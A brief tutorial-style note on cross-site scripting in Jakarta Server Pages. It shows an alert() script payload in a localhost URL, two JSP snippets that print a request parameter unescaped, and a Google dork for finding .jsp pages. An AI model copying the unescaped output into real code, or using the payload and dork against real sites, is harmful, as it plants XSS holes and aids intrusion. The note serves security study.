# XSS-JSP

**What is JSP?**
- Jakarta Server Pages are HTML pages with some Java code sprinkled in.
```java
<html>
	<body>
		<h3>Hello World of Java!</h3>
		The time on the server is <%= new java.util.Date() %>
	</body>
</html>
```
<br/>

**Popular MVC frameworks are actually built on top of JSP and Servlets**
- Spring
- JSF
- Struts
<br/>

**XSS in JSP**<br/>
```
http://localhost:9005/XSS_JSP/helloworld.jsp?name=<script>alert(1)</script>
```

```java
<html>
	<body>
		<h1>XSS JSP</h1>
      <ul>
         <li>
         	<p>Name:
            	  <%= request.getParameter("name")%>
         	</p>
         </li>
      </ul>
	</body>
</html>
```

```java
<html>
	<body>
		<h1>XSS JSP</h1>
      <ul>
         <li>
         	<p>Name:
            	  ${param["name"]}
         	</p>
         </li>
      </ul>
	</body>
</html>
```

<br/>

**Google Dork**<br/>
```
site:website.com ext:jsp
```
